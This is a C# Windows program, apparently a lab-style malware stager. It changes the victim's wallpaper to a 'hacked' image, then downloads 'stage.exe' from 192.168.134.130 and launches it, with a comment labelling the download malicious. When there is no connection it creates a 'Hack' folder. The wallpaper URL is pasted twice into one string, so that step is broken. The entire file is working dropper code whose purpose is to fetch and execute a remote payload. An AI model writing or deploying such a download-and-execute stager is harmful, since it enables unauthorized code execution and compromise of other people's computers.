using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

namespace checkInternet
{
    class Program
    {
        public const int SPI_SETDESKWALLPAPER = 20;
        public const int SPIF_UPDATEINIFILE = 1;
        public const int SPIF_SENDCHANGE = 2;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (client.OpenRead("http://google.com/"))
                    return true;
            }
            catch
            {
                return false;
            }
        }

        static bool DownloadFile(string path, string dst)
        {
            try
            {
                var client = new WebClient();
                client.DownloadFile(path, dst);
                
                return true;
            }
            catch
            {
                
                return false;
            }
        }

        static bool CreateFolder(string path)
        {
            try
            {
                if (!Directory.Exists(path))
                {
                    Directory.CreateDirectory(path);
                }
                return true;
            }
            catch
            {
                return false;
            }
            
        }

        static bool changeBackground()
        {
            try
            {
                DownloadFile("https://thumbs.dreamstime.com/b/matrix-background-style-computer-virus-hacker-screen-wallpa-wallpaper-green-dominant-color-format-121069553.jpghttps://thumbs.dreamstime.com/b/matrix-background-style-computer-virus-hacker-screen-wallpa-wallpaper-green-dominant-color-format-121069553.jpg", "hacked.jpg");
                string path = AppDomain.CurrentDomain.BaseDirectory;
                SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path+"hacked.jpg", SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
                Thread.Sleep(1000);
                return true;
            }
            catch
            {
                return false;
            }

        }
        static void Main()
        {
            var isChangeBackground = changeBackground();
            if (isChangeBackground)
            {
                Console.WriteLine("Change successfully");
            }
            else
            {
                Console.WriteLine("Change Failed");
            }

            var isConnect = CheckForInternetConnection();
            Console.WriteLine("Connect to Internet:  "+ isConnect);

            if (isConnect)
            {
                //Download file malicious
                var isDownload = DownloadFile("http://192.168.134.130/stage.exe", "./stage.exe");
 
                if (isDownload)
                {
                    Console.WriteLine("1) Download Successfully");
                }
                else
                {
                    Console.WriteLine("1) Download Failed");
                }

                //Start a execute file
                try {
                    string path = AppDomain.CurrentDomain.BaseDirectory;
                    Process.Start(path+"/stage.exe");
                    Console.WriteLine("2) Execute sucessfully");
                }
                catch
                {
                    Console.WriteLine("2) Execute Failed");
           
                }
            }
            else
            {
                Console.WriteLine("3) Create a folder");
                var isCreate = CreateFolder("./Hack");
                if (isCreate)
                {
                    Console.WriteLine("Sucessful!");
                }
                else
                {
                    Console.WriteLine("Failed!");
                }
            }
        }
    }
}
